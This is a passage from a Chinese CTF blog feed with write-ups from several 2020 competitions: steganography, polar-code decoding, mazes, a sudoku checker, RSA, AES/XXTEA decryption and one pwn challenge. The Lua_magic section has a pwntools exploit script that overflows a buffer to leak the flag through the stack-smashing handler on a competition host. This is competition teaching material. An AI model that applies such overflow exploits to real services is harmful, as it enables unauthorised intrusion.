title="2019-nCoV"></a>2019-nCoV</h2><p>有三个文件，mp3，wav和一个压缩包，然后题目新增了一个hint，很容易看出来base32编码</p><pre><code>http://www.merrybio.com.cn/blog/SARS-CoV-2-genomic-analysis.htmlhttps://www.ncbi.nlm.nih.gov/orffinder/http://www.merrybio.com.cn/blog/coronavirus-introduction.htmlPlease notice The largest structural proteinthe password is the md5(it&#39;s gene sequence) and do not let the ‘\n’ in md5()</code></pre><p>给的文章有新冠病毒的介绍和基因查询页面，根据提示要算S蛋白质的基因序列的md5得到密码，这个密码是mp3隐写的密码，用MP3Stego解出来又一个密码“2019-nCoV”，试了一下是压缩包密码</p><pre><code class="python">m = hashlib.md5()m.update(&quot;MFLLTTKRTMFVFLVLLPLVSSQCVNLTTRTQLPPAYTNSFTRGVYYPDKVFRSSVLHSTQDLFLPFFSNVTWFHAIHVSGTNGTKRFDNPVLPFNDGVYFASTEKSNIIRGWIFGTTLDSKTQSLLIVNNATNVVIKVCEFQFCNDPFLGVYYHKNNKSWMESEFRVYSSANNCTFEYVSQPFLMDLEGKQGNFKNLREFVFKNIDGYFKIYSKHTPINLVRDLPQGFSALEPLVDLPIGINITRFQTLLALHRSYLTPGDSSSGWTAGAAAYYVGYLQPRTFLLKYNENGTITDAVDCALDPLSETKCTLKSFTVEKGIYQTSNFRVQPTESIVRFPNITNLCPFGEVFNATRFASVYAWNRKRISNCVADYSVLYNSASFSTFKCYGVSPTKLNDLCFTNVYADSFVIRGDEVRQIAPGQTGKIADYNYKLPDDFTGCVIAWNSNNLDSKVGGNYNYLYRLFRKSNLKPFERDISTEIYQAGSTPCNGVEGFNCYFPLQSYGFQPTNGVGYQPYRVVVLSFELLHAPATVCGPKKSTNLVKNKCVNFNFNGLTGTGVLTESNKKFLPFQQFGRDIADTTDAVRDPQTLEILDITPCSFGGVSVITPGTNTSNQVAVLYQDVNCTEVPVAIHADQLTPTWRVYSTGSNVFQTRAGCLIGAEHVNNSYECDIPIGAGICASYQTQTNSPRRARSVASQSIIAYTMSLGAENSVAYSNNSIAIPTNFTISVTTEILPVSMTKTSVDCTMYICGDSTECSNLLLQYGSFCTQLNRALTGIAVEQDKNTQEVFAQVKQIYKTPPIKDFGGFNFSQILPDPSKPSKRSFIEDLLFNKVTLADAGFIKQYGDCLGDIAARDLICAQKFNGLTVLPPLLTDEMIAQYTSALLAGTITSGWTFGAGAALQIPFAMQMAYRFNGIGVTQNVLYENQKLIANQFNSAIGKIQDSLSSTASALGKLQDVVNQNAQALNTLVKQLSSNFGAISSVLNDILSRLDKVEAEVQIDRLITGRLQSLQTYVTQQLIRAAEIRASANLAATKMSECVLGQSKRVDFCGKGYHLMSFPQSAPHGVVFLHVTYVPAQEKNFTTAPAICHDGKAHFPREGVFVSNGTHWFVTQRNFYEPQIITTDNTFVSGNCDVVIGIVNNTVYDPLQPELDSFKEELDKYFKNHTSPDVDLGDISGINASVVNIQKEIDRLNEVAKNLNESLIDLQELGKYEQYIKWPWYIWLGFIAGLIAIVMVTIMLCCMTSCCSCLKGCCSCGSCCKFDEDDSEPVLKGVKLHYT&quot;.encode())print(m.hexdigest())# 98eb1b1760bcc837934c8695a1cee923</code></pre><p>wav是lsb隐写，直接用SilentEye解码得到一串没什么意义的字符“priebeijoarkjpxmdkucxwdus”</p><p>压缩包得到一张图片和hint2</p><p>hint2 16进制转ascii码得到第二个提示</p><pre><code>you must pay attention to N protein ,How do that get into the viral capsid?do you know steghide?the password is encrypt by VigenÃ¨re Cipherthe screct key is The top 20 characters with the most occurrences are counted+COMBAT&#39;</code></pre><p>图片应该是用steghide做的隐写，隐写的密码是刚刚wav隐写得到的字符经过维吉尼亚密码解码之后的结果，但是维吉尼亚密码的密钥就跟第一句不明不白的话有关系，卡了很久，后来仔细看一下文章，有这么一句话</p><pre><code>核衣壳蛋白（nucleoprotein，N）位于囊膜内部，呈螺旋状，包裹着病毒单股正链的RNA基因组。病毒在进行装配时，N蛋白先和病毒RNA相互作用形成复合体形式，然后再结合M蛋白、E蛋白，最后被包装进入病毒衣壳内。</code></pre><p>猜测是对N蛋白质、M蛋白质、E蛋白质的基因序列进行词频统计</p><pre><code class="python">dic = &#123;&#125;N=&quot;MSDNGPQNQRNAPRITFGGPSDSTGSNQNGERSGARSKQRRPQGLPNNTASWFTALTQHGKEDLKFPRGQGVPINTNSSPDDQIGYYRRATRRIRGGDGKMKDLSPRWYFYYLGTGPEAGLPYGANKDGIIWVATEGALNTPKDHIGTRNPANNAAIVLQLPQGTTLPKGFYAEGSRGGSQASSRSSSRSRNSSRNSTPGSSRGTSPARMAGNGGDAALALLLLDRLNQLESKMSGKGQQQQGQTVTKKSAAEASKKPRQKRTATKAYNVTQAFGRRGPEQTQGNFGDQELIRQGTDYKHWPQIAQFAPSASAFFGMSRIGMEVTPSGTWLTYTGAIKLDDKDPNFKDQVILLNKHIDAYKTFPPTEPKKDKKKKADETQALPQRQKKQQTVTLLPAADLDDFSKQLQQSMSSADSTQAMFHLVDFQVTIAEILLIIMRTFKVSIWNLDYIINLIIKNLSKSLTENKYSQLDEEQPMEIDMADSNGTITVEELKKLLEQWNLVIGFLFLTWICLLQFAYANRNRFLYIIKLIFLWLLWPVTLACFVLAAVYRINWITGGIAIAMACLVGLMWLSYFIASFRLFARTRSMWSFNPETNILLNVPLHGTILTRPLLESELVIGAVILRGHLRIAGHHLGRCDIKDLPKEITVATSRTLSYYKLGASQRVAGDSGFAAYSRYRIGNYKLNTDHSSSSDNIALLVQ&quot;for word in N:    if word not in dic:        dic[word] = 1    else:        dic[word] = dic[word] + 1swd = sorted(dic.items(), key=lambda asd: asd[1], reverse=True)print(swd)# LGASTRIQKNDPFEVYMWHC</code></pre><p>一共20个字符按照频次从高到低的顺序排列，在后面添加COMBAT得到密钥<code>LGASTRIQKNDPFEVYMWHCCOMBAT</code></p><p>解维吉尼亚密码得到隐写的密码<code>eliminatenovelcoronavirts</code></p><p>用steghide解出flag</p><pre><code>flag&#123;we_will_over_come_SARS-COV&#125;</code></pre>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>2020-全国工业互联网安全技术技能大赛</title>
      <link href="/2020/10/24/2020-10-24-2020-%E5%85%A8%E5%9B%BD%E5%B7%A5%E4%B8%9A%E4%BA%92%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B/"/>
      <url>/2020/10/24/2020-10-24-2020-%E5%85%A8%E5%9B%BD%E5%B7%A5%E4%B8%9A%E4%BA%92%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<p>2020-全国工业互联网安全技术技能大赛</p><span id="more"></span><h2 id="5G"><a href="#5G" class="headerlink" title="5G"></a>5G</h2><p>考查polar编码</p><pre><code class="cpp">sub_401FD0();  v3 = time(0);  srand(v3);  memset(&amp;v32, 0, 0x80u);  v30 = (char *)malloc(dword_40F040 + 1);  sub_40E540(&quot;%64s&quot;, &amp;v32);  v26 = (signed int)(double)sub_4029B0((long double)dword_40F040);  v29 = dword_40F040;  v4 = 4 * (dword_40F040 / 2);  v31 = dword_40F040 / 2;  v5 = malloc(4 * (dword_40F040 / 2));  v28 = malloc(v4);  memcpy(v5, &amp;dword_40F080, v4);  memcpy(v28, (char *)&amp;dword_40F080 + v4, v4);  v6 = 0;  v27 = malloc(4 * v29);  memset(v27, 0, 4 * v29);  v7 = v30;  do  &#123;     LOBYTE(v8) = *((_BYTE *)&amp;v32 + v6);     v9 = 0;     do     &#123;        v10 = v8 &amp; 1;        v8 = (unsigned int)(char)v8 &gt;&gt; 1;        v7[v9++] = v10;      &#125;      while ( v9 != 8 );      ++v6;      v7 += 8;  &#125;  while ( v6 != 64 );</code></pre><p>main函数开始先输入64个字符，然后转换成比特，共512位，进行编码和传输，题目中给了输出可以根据输出进行解码求输入，解码部分根据提示利用开源代码<a href="https://github.com/albusSimba/pyPolar">https://github.com/albusSimba/pyPolar</a>实现，但是解码出来的数据位数是1024位，在编码最开始赋值的时候还有一个类似于换表的操作，将512位数据打乱写入1024位的矩阵中，所以解码的时候还需要提取出输入的512位，才可以得到最终结果</p><pre><code class="python">from QueryPerformanceCounter import *from polarcodes5G import *​n = 1024k = n // 2performance_counter = QueryPerformanceCounter()myPC = Construct(n, k)s = &quot;-1.756208 1.027628 -0.952465 -1.638855 -1.462390 0.208588 0.591268 -0.179454 1.095095 0.447900 0.947692 1.350273 -1.155633 -1.938154 0.046054 1.175568 -0.007052 1.220866 1.890119 1.539061 0.677526 -0.493938 1.113000 1.148966 0.437962 -1.025365 -1.001201 -0.274902 0.545109 -1.125495 -1.112381 0.214771 0.635569 …………&quot;t = [float(i) for i in s.split(&quot; &quot;)]myPC.llrs = np.array(t)performance_counter.start()Decoder(myPC)performance_counter.end(&quot;Decoder&quot;)res = list(myPC.message_received)bits = list(myPC.msg_bits)f = [0] * 512for i, c in enumerate(bits):   f[i] = res[c]for i in range(0, 512, 8):   ch = 0   for j in range(8):       ch += (f[i + j] &amp;lt;&amp;lt; j) &amp;amp; 0xff   print(chr(ch), end=&quot;&quot;)​# Congratz!Your_flag_is:flag&#123;632828e1-5b6f-4bae-9320-a2808d193a23&#125;</code></pre>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>2020-巅峰极客</title>
      <link href="/2020/09/26/2020-09-26-2020-%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/"/>
      <url>/2020/09/26/2020-09-26-2020-%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/</url>
      
        <content type="html"><![CDATA[<p>2020-巅峰极客</p><span id="more"></span><h2 id="re"><a href="#re" class="headerlink" title="re"></a>re</h2><h2 id="virus"><a href="#virus" class="headerlink" title="virus"></a>virus</h2><p>简单的迷宫题，开始先输入四个数选择地图顺序，然后输入以wasd组成的操作序列，用-隔开，每一个序列都会有长度限制，对应了四个迷宫不同的路线长度，所以把迷宫找出来就解出来了</p><pre><code>maze1|||||||||||||||||||||||||||||||||||||||||||||||s………||||||||||||||.|||||d||||||||.|||||.||||||||.|||||.||||||||.|||||……….||||||||||||||||||</code></pre><p>start (3,2) a2=1</p><p>dddddddddsssssaaaaaaaaawww</p><p>len=26</p><pre><code>maze2|||||||||||||||||||||s|||||||||||||d||||..|||||||||||..|||||..|||||||||..|||||||..|||||||..|||||||||..|||||..|||||||||||..|||..|||||||||||||..|..|||||||||||||||…|||||||||||||||||||||||||||</code></pre><p>start (1,2) a2=2</p><p>sdsdsdsdsdsdsddwdwdwdwdwdwdw</p><p>len=28</p><pre><code>maze3|||||||||||||||||………s|||||.||||||||||||||.||||||||||||||.||||||||||||||.||||||||||||||.||||||||||||||.||||||||||||||………d||||||||||||||||||</code></pre><p>start (1,B) a2=3</p><p>aaaaaaaaasssssssddddddddd</p><p>len=25</p><pre><code>maze4||||||||||||||||||||||||||||||||||||||||||||||||……….|||||.||||||||.|||||.||||||||.|||||.||||||||.|||||.||||||||.|||||s||||||||d|||||||||||||||||</code></pre><p>start (8,3) a2=4</p><p>wwwwwdddddddddsssss</p><p>len=19</p><p>长度顺序为19 25 26 28，所以对应的结果如下：</p><p>4312-wwwwwdddddddddsssss-aaaaaaaaasssssssddddddddd-dddddddddsssssaaaaaaaaawww-sdsdsdsdsdsdsddwdwdwdwdwdwdw</p><p>套上flag即可</p><h2 id="fu-k-py"><a href="#fu-k-py" class="headerlink" title="fu!k_py"></a>fu!k_py</h2><p>这题也比较简单，没什么好说的，解压得到的pyc文件没有任何修改，可以直接uncompyle</p><pre><code class="python">(lambda __g, __print: [ [ (lambda __after: [ (lambda __after: (__print(&#39;Error len!&#39;), (exit(), __after())[1])[1] if len(input) != 87 else __after())(lambda : [ [ [ [ (lambda __after: (__print(&#39;Error fmt!&#39;), (exit(0), __after())[1])[1] if fmt1 != &#39;flag&#123;&#39; or fmt2 != &#39;&#125;&#39; else __after())(lambda : (d.append(context[0:9]), (d.append(context[9:18]), (d.append(context[18:27]), (d.append(context[27:36]), (d.append(context[36:45]), (d.append(context[45:54]), (d.append(context[54:63]), (d.append(context[63:72]), (d.append(context[72:81]), [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ (lambda __after: (__print(&#39;Error!&#39;), (exit(), __after())[1])[1] if d[0][2] != &#39;5&#39; or d[0][3] != &#39;3&#39; else __after())(lambda : (lambda __after: (__print(&#39;Error!&#39;), (exit(), __after())[1])[1] if d[1][0] != &#39;8&#39; or d[1][7] != &#39;2&#39; else __after())(lambda : (lambda __after: (__print(&#39;Error!&#39;), (exit(), __after())[1])[1] if d[2][1] != &#39;7&#39; or d[2][4] != &#39;1&#39; or d[2][6] != &#39;5&#39; else __after())(lambda : (lambda __after: (__print(&#39;Error!&#39;), (exit(), __after())[1])[1] if d[3][0] != &#39;4&#39; or d[3][5] != &#39;5&#39; or d[3][6] != &#39;3&#39; else __after())(lambda : (lambda __after: (__print(&#39;Error!&#39;), (exit(), __after())[1])[1] if d[4][1] != &#39;1&#39; or d[4][4] != &#39;7&#39; or d[4][8] != &#39;6&#39; else __after())(lambda : (lambda __after: (__print(&#39;Error!&#39;), (exit(), __after())[1])[1] if d[5][2] != &#39;3&#39; or d[5][3] != &#39;2&#39; or d[5][7] != &#39;8&#39; else __after())(lambda : (lambda __after: (__print(&#39;Error!&#39;), (exit(), __after())[1])[1] if d[6][1] != &#39;6&#39; or d[6][3] != &#39;5&#39; or d[6][8] != &#39;9&#39; else __after())(lambda : (lambda __after: (__print(&#39;Error!&#39;), (exit(), __after())[1])[1] if d[7][2] != &#39;4&#39; or d[7][7] != &#39;3&#39; else __after())(lambda : (lambda __after: (__print(&#39;Error!&#39;), (exit(), __after())[1])[1] if d[8][5] != &#39;9&#39; or d[8][6] != &#39;7&#39; else __after())(lambda : (lambda __after: (__print(&#39;Error!&#39;), (exit(), __after())[1])[1] if check(h1) != 45 or check(h2) != 45 or check(h3) != 45 or check(h4) != 45 or check(h5) != 45 or check(h6) != 45 or check(h7) != 45 or check(h8) != 45 or check(h9) != 45 else __after())(lambda : (lambda __after: (__print(&#39;Error!&#39;), (exit(), __after())[1])[1] if check(l1) != 45 or check(l2) != 45 or check(l3) != 45 or check(l4) != 45 or check(l5) != 45 or check(l6) != 45 or check(l7) != 45 or check(l8) != 45 or check(l9) != 45 else __after())(lambda : (lambda __after: (__print(&#39;Error!&#39;), (exit(), __after())[1])[1] if check(k1) != 45 or check(k2) != 45 or check(k3) != 45 or check(k4) != 45 or check(k5) != 45 or check(k6) != 45 or check(k7) != 45 or check(k8) != 45 or check(k9) != 45 else __after())(lambda : (lambda __after: (__print(&#39;Error!&#39;), (exit(), __after())[1])[1] if check1(h1) != 1 or check1(h2) != 1 or check1(h3) != 1 or check1(h4) != 1 or check1(h5) != 1 or check1(h6) != 1 or check1(h7) != 1 or check1(h8) != 1 or check1(h9) != 1 else __after())(lambda : (lambda __after: (__print(&#39;Error!&#39;), (exit(), __after())[1])[1] if check1(l1) != 1 or check1(l2) != 1 or check1(l3) != 1 or check1(l4) != 1 or check1(l5) != 1 or check1(l6) != 1 or check1(l7) != 1 or check1(l8) != 1 or check1(l9) != 1 else __after())(lambda : (lambda __after: (__print(&#39;Error!&#39;), (exit(), __after())[1])[1] if check1(k1) != 1 or check1(k2) != 1 or check1(k3) != 1 or check1(k4) != 1 or check1(k5) != 1 or check1(k6) != 1 or check1(k7) != 1 or check1(k8) != 1 or check1(k9) != 1 else __after())(lambda : (__print(&#39;Yes! You got it!&#39;), __after())[1])))))))))))))))     for __g[&#39;k9&#39;] in [context[60] + context[61] + context[62] + context[69] + context[70] + context[71] + context[78] + context[79] + context[80]] ][0]     for __g[&#39;k8&#39;] in [context[57] + context[58] + context[59] + context[66] + context[67] + context[68] + context[75] + context[76] + context[77]] ][0]     for __g[&#39;k7&#39;] in [context[54] + context[55] + context[56] + context[63] + context[64] + context[65] + context[72] + context[73] + context[74]] ][0]     for __g[&#39;k6&#39;] in [context[33] + context[34] + context[35] + context[42] + context[43] + context[44] + context[51] + context[52] + context[53]] ][0]     for __g[&#39;k5&#39;] in [context[30] + context[31] + context[32] + context[39] + context[40] + context[41] + context[48] + context[49] + context[50]] ][0]     for __g[&#39;k4&#39;] in [context[27] + context[28] + context[29] + context[36] + context[37] + context[38] + context[45] + context[46] + context[47]] ][0]     for __g[&#39;k3&#39;] in [context[6] + context[7] + context[8] + context[15] + context[16] + context[17] + context[24] + context[25] + context[26]] ][0]     for __g[&#39;k2&#39;] in [context[3] + context[4] + context[5] + context[12] + context[13] + context[14] + context[21] + context[22] + context[23]] ][0]     for __g[&#39;k1&#39;] in [context[0] + context[1] + context[2] + context[9] + context[10] + context[11] + context[18] + context[19] + context[20]] ][0] for __g[&#39;l9&#39;] in [context[8] + context[17] + context[26] + context[35] + context[44] + context[53] + context[62] + context[71] + context[80]] ][0]  for __g[&#39;l8&#39;] in [context[7] + context[16] + context[25] + context[34] + context[43] + context[52] + context[61] + context[70] + context[79]] ][0]  for __g[&#39;l7&#39;] in [context[6] + context[15] + context[24] + context[33] + context[42] + context[51] + context[60] + context[69] + context[78]] ][0]  for __g[&#39;l6&#39;] in [context[5] + context[14] + context[23] + context[32] + context[41] + context[50] + context[59] + context[68] + context[77]] ][0]  for __g[&#39;l5&#39;] in [context[4] + context[13] + context[22] + context[31] + context[40] + context[49] + context[58] + context[67] + context[76]] ][0]  for __g[&#39;l4&#39;] in [context[3] + context[12] + context[21] + context[30] + context[39] + context[48] + context[57] + context[66] + context[75]] ][0]  for __g[&#39;l3&#39;] in [context[2] + context[11] + context[20] + context[29] + context[38] + context[47] + context[56] + context[65] + context[74]] ][0]  for __g[&#39;l2&#39;] in [context[1] + context[10] + context[19] + context[28] + context[37] + context[46] + context[55] + context[64] + context[73]] ][0]  for __g[&#39;l1&#39;] in [context[0] + context[9] + context[18] + context[27] + context[36] + context[45] + context[54] + context[63] + context[72]] ][0]  for __g[&#39;h9&#39;] in [context[72:81]] ][0]  for __g[&#39;h8&#39;] in [context[63:72]] ][0]  for __g[&#39;h7&#39;] in [context[54:63]] ][0]  for __g[&#39;h6&#39;] in [context[45:54]] ][0]  for __g[&#39;h5&#39;] in [context[36:45]] ][0]  for __g[&#39;h4&#39;] in [context[27:36]] ][0]  for __g[&#39;h3&#39;] in [context[18:27]] ][0]  for __g[&#39;h2&#39;] in [context[9:18]] ][0]  for __g[&#39;h1&#39;] in [context[0:9]] ][0] )[1])[1])[1])[1])[1])[1])[1])[1])[1])  for **g[&#39;d&#39;] in [[]] ][0]  for __g[&#39;context&#39;] in [input[5:-1]] ][0]  for __g[&#39;fmt2&#39;] in [input[(-1)]] ][0]  for __g[&#39;fmt1&#39;] in [input[0:5]] ][0])  for __g[&#39;input&#39;] in [raw_input(&#39;Input your flag:&#39;)] ][0] if __name** == &#39;**main**&#39; else **after())(lambda : None)  for __g[&#39;check1&#39;], check1.__name** in [(lambda arg: (lambda **l: [ (lambda __after: 0 if len(list(set(__l[&#39;arg&#39;]))) != 9 else 1)(lambda : None) for __l[&#39;arg&#39;] in [arg] ][0])(&#123;&#125;), &#39;check1&#39;)] ][0]  for __g[&#39;check&#39;], check.__name** in [(lambda arg: (lambda **l: [ sum(map(int, __l[&#39;arg&#39;])) for __l[&#39;arg&#39;] in [arg] ][0])(&#123;&#125;), &#39;check&#39;)] ][0])(globals(), __import**(&#39;**builtin**&#39;, level=0).**dict**[&#39;print&#39;]) </code></pre><p>代码可读性很差，但是可以大概了解一下信息，一共输入81位，某些特定的位数上的数字是确定的，其中定义了一些变量，可以很轻易看出来分别是行、列和九宫格，两个check也很清晰，查每行每列每个九宫格有无重复数字，查和是否为45，这很显然是一个数独，直接解就可以了。</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>2020-ciscn 西北赛区分区赛</title>
      <link href="/2020/09/19/2020-09-19-2020-ciscn_%E8%A5%BF%E5%8C%97%E8%B5%9B%E5%8C%BA%E5%88%86%E5%8C%BA%E8%B5%9B/"/>
      <url>/2020/09/19/2020-09-19-2020-ciscn_%E8%A5%BF%E5%8C%97%E8%B5%9B%E5%8C%BA%E5%88%86%E5%8C%BA%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<p>2020-ciscn 西北赛区分区赛</p><span id="more"></span><h2 id="Lua-magic"><a href="#Lua-magic" class="headerlink" title="Lua_magic"></a>Lua_magic</h2><p>程序先读取了一个lua脚本，跑三次循环，每次输入两个数，根据这两个数算出一个新的数字和生成的随机数比较，如果相同进行下一次验证，不同直接退出<br>Random函数在之前没有设置种子，所以是个伪随机数，所以只需要知道运算的过程就可以了，但是一开始没有给lua文件，只能盲打，输入几个数字之后发现，第一个数来选择用于运算的数，然后和第二个数异或，得到最终的结果，先在linux环境下写个程序生成随机数<br>默认第一个数输入0，根据异或出来的结果构造三个数字，绕过前面的检验，但是最后读入flag文件之后没有输出，最后一个read存在溢出，开启了cannary保护，直接利用ssp输出flag值</p><pre><code class="python">from pwn import *localfile = &quot;./Lua_magic&quot;locallibc = &#39;/lib/x86_64-linux-gnu/libc.so.6&#39;remotelibc = locallibclocal = Falseif local:    io = process(localfile)    libc = ELF(locallibc)    elf = ELF(localfile)else:    io = remote(&#39;172.1.13.17&#39;, 8888)    libc = ELF(remotelibc)    elf = ELF(localfile)# context.log_level = &#39;debug&#39;context.arch = elf.archse = lambda data: io.send(data)sa = lambda delim, data: io.sendafter(delim, data)sl = lambda data: io.sendline(data)sla = lambda delim, data: io.sendlineafter(delim, data)sea = lambda delim, data: io.sendafter(delim, data)rc = lambda numb=4096: io.recv(numb)ru = lambda delims, drop=True: io.recvuntil(delims, drop)info_addr = lambda tag, addr: io.info(tag + &#39;: &#123;:#x&#125;&#39;.format(addr))uu32 = lambda data: u32(data.ljust(4, &#39;\0&#39;))uu64 = lambda data: u64(data.ljust(8, &#39;\0&#39;))def debug(cmd=&#39;&#39;):    gdb.attach(io, cmd)# info# gadget# shellcode# ropio=remote(&quot;172.1.13.17&quot;,8888)ru(&quot;heart;)\n&quot;)sl(&quot;0 1808823121&quot;)ru(&quot;who am I?\n&quot;)print io.recv()sl(&quot;0 840963568&quot;)ru(&quot;who am I?\n&quot;)print io.recv()sl(&quot;0 1684516447&quot;)ru(&quot;who am I?\n&quot;)print io.recv()sl(p64(0x602140)*35)print io.recv()#debug(&#39;b *0x0000000000400766&#39;)io.interactive()</code></pre><h2 id="Gameover"><a href="#Gameover" class="headerlink" title="Gameover"></a>Gameover</h2><p>先读取随机数，然后转换成了16进制字符串，之后列出菜单<br>输入选项，1是查看密文，7是最后一步验证，其他的字符都是进行一步输入，绕过最后一步验证之后就可以拿到shell，最后一个验证比较开始读取的随机数和最后一次输入是否相同<br>中间加密过程进行了一些大数运算，关键运算在于BN_mod_exp，表示(v13**v12) mod v11，其中v11是中间一串大数，尝试分解发现很难分解，猜测是大素数之积，v13是我们需要知道的随机数也就是明文，整个加密的过程就是rsa，这里发现，因为同在bss段上，可以利用菜单2的输入覆盖掉v12的值，也就是构造相同m、相同n、不同e生成的两条密文，存在共模攻击，可以直接算出明文也就是最后需要的输入</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>2020-DDCTF</title>
      <link href="/2020/09/08/2020-09-08-2020-DDCTF/"/>
      <url>/2020/09/08/2020-09-08-2020-DDCTF/</url>
      
        <content type="html"><![CDATA[<p>这次re全是安卓，后面两题连脱壳的环境都没搭好……</p><span id="more"></span><h2 id="re1"><a href="#re1" class="headerlink" title="re1"></a>re1</h2><p>安卓逆向，但是没加壳，很容易找到判断的逻辑，两层加密最后经过一层md5，后来更新提示把md5之前的结果给出来了，就很好逆了。</p><p>整个程序流程是一个AES加密之后进行XXTEA加密，只是AES的S盒经过了处理，逆回来就可以发现是AES的S盒，直接上脚本解密就好了。</p><pre><code class="python">from Crypto.Cipher import AESfrom binascii import a2b_hex_DELTA = 0x9E3779B9def decrypt_xxtea(str):    if str == &#39;&#39;: return str    v = str    k = [2, 2, 3, 4]    n = len(v) - 1    z = v[n]    y = v[0]    q = 6 + 52 // (n + 1)    sum = (q * _DELTA) &amp;amp; 0xffffffff    while (sum != 0):        e = sum &gt;&gt; 2 &amp;amp; 3        for p in range(n, 0, -1):            z = v[p - 1]            v[p] = (v[p] - ((z &gt;&gt; 5 ^ y &amp;lt;&amp;lt; 2) + (y &gt;&gt; 3 ^ z &amp;lt;&amp;lt; 4) ^ (sum ^ y) + (k[p &amp;amp; 3 ^ e] ^ z))) &amp;amp; 0xffffffff            y = v[p]        z = v[n]        v[0] = (v[0] - ((z &gt;&gt; 5 ^ y &amp;lt;&amp;lt; 2) + (y &gt;&gt; 3 ^ z &amp;lt;&amp;lt; 4) ^ (sum ^ y) + (k[0 &amp;amp; 3 ^ e] ^ z))) &amp;amp; 0xffffffff        y = v[0]        sum = (sum - _DELTA) &amp;amp; 0xffffffff    return vt = [0x15ef75f4, 0xc4277b7a, 0xe7f4412d, 0x78e78345, 0xecf16de2, 0xd5d29477, 0x2169b3a0, 0x2a685baa]target = decrypt_xxtea(t)s = &quot;&quot;for i in target:    tmp = hex(i)[2:].rjust(8, &#39;0&#39;)    s += tmp[-2:]    s += tmp[-4:-2]    s += tmp[-6:-4]    s += tmp[-8:-6]s = s.encode()def decrypt(text):    key = b&quot;1234567890123456&quot;    # iv = b&quot;\x9d\x25\xdd\xe0\xc1\x37\x86\x21\x32\xec\x0c\x32\x4c\xfb\xf0\x46&quot;    mode = AES.MODE_ECB    cryptos = AES.new(key, mode)    plain_text = cryptos.decrypt(a2b_hex(text))    return plain_textd = decrypt(s)print(&quot;解密:&quot;, d)# 解密: b&#39;DDCTF&#123;qazasd1234$&#125;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&#39;</code></pre><p>得到flag</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>2020-钓鱼城杯-wp</title>
      <link href="/2020/08/28/2020-08-28-2020-%E9%92%93%E9%B1%BC%E5%9F%8E%E6%9D%AF-wp/"/>
      <url>/2020/08/28/2020-08-28-2020-%E9%92%93%E9%B1%BC%E5%9F%8E%E6%9D%AF-wp/</url>
      
        <content type="html"><![CDATA[<p>2020-钓鱼城杯</p><span id="more"></span><h2 id="re"><a href="#re" class="headerlink" title="re"></a>re</h2><h2 id="reg"><a href="#reg" class="headerlink" title="reg"></a>reg</h2><p>打开程序发现调用方式很奇怪，调试直接运行然后暂停通过stack trace找到输入函数，以宽字符输入然后处理成字符串，接着生成了两串数据，在这里绕了很久，总在找生成逻辑，实际上生成的数和输入没有关系，每次运行都会生成同样的数</p><pre><code>e3dfb24a5553edac13ff65ac7b5f3170 9d25dde0c137862132ec0c324cfbf046</code></pre><p>发现之后接着调试，程序调用了wincrypt的API用来加密，根据传入的数据查到AES加密，整个程序的逻辑为，用生成的两串数作为iv和key，输入作为明文，输出经过base64编码之后显示到终端并写入到文件里，所以直接解密即可</p><pre><code class="python">from Crypto.Cipher import AESfrom binascii import b2a_hex, a2b_hexdef add_to_16(text):    if len(text.encode(&#39;utf-8&#39;)) % 16:        add = 16 - (len(text.encode(&#39;utf-8&#39;)) % 16)    else:        add = 0    text = text + (&#39;\0&#39; * add)    return text.encode(&#39;utf-8&#39;)def decrypt(text):    key = b&quot;\xe3\xdf\xb2\x4a\x55\x53\xed\xac\x13\xff\x65\xac\x7b\x5f\x31\x70&quot;    iv = b&quot;\x9d\x25\xdd\xe0\xc1\x37\x86\x21\x32\xec\x0c\x32\x4c\xfb\xf0\x46&quot;    mode = AES.MODE_CBC    cryptos = AES.new(key, mode, iv)    plain_text = cryptos.decrypt(a2b_hex(text))    return plain_textif __name__ == &#39;__main__&#39;:    d = decrypt(        b&quot;F10014173233C3482DACB7915297AC89E45781087077C39F4F00C832B6C12DA6D2C75E4133CE84FB6440B10FD124A72A&quot;)    print(&quot;解密:&quot;, d)# b&#39;flag&#123;this_flag_not_beyr_f81_8837fu8&#125;\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c&#39;</code></pre>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> writeup </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020-强网杯-wp</title>
      <link href="/2020/08/28/2020-08-28-2020-%E5%BC%BA%E7%BD%91%E6%9D%AF-wp/"/>
      <url>/2020/08/28/2020-08-28-2020-%E5%BC%BA%E7%BD%91%E6%9D%AF-wp/</url>
      
